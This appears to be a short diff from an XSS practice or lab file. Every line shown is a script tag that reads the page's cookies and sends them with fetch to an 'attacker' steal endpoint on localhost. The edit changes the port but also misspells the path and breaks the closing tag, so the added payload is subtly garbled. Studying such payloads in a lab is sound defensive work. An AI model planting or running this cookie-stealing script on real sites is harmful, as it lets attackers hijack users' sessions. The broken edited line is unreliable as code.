@@ -1,7 +1,7 @@
 <script>fetch('http://localhost:5000/attacker/xss/steal?cookie=' + encodeURIComponent(document.cookie));</script>
 
 
-<script>fetch('http://localhost:8080/attacker/xss/steal?cookie=' + encodeURIComponent(document.cookie));</script>
+<script>fetch('http://localhost:8080/atttacker/xss/steal?cookie=' + encodeURIComponent(document.cookie));</scrip>
 
 
 
